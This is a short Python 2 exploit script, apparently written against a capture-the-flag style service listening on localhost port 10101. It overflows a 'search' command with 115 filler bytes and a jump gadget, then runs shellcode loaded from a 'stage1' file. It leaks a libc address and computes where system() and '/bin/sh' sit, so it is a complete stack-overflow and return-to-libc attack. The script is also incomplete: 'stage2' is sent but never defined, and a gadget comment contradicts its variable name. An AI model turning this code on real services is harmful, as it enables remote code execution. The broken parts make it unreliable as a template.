import socket
import struct
import os
import sys
from binascii import hexlify

def recv_until(s, content=""):
    res=""
    while True:
        temp = s.recv(4096)
        res += temp
        if not temp or res.find(content)!=-1:
            break
    return res

def p(a):
    return struct.pack("<I", a)
def u(a):
    return struct.unpack("<I", a)[0]

s=socket.create_connection(('localhost',10101))
recv_until(s, "\n> ")

raw_input("gdb")

jmp_esp = 0x804aacb # in the .eh_frame segment pop esp; ret
payload = "A"*115 + p(jmp_esp) + open("stage1", "rb").read()
s.send("search "+payload+"\n")

lsm = u(s.recv(4))
system = lsm + 0x24ed0
sh = lsm + 0x125434
print "[+]lsm: " + hex(lsm)
print "[+]system: " + hex(system)
print "[+]/bin/sh: " + hex(sh)

s.send(stage2)

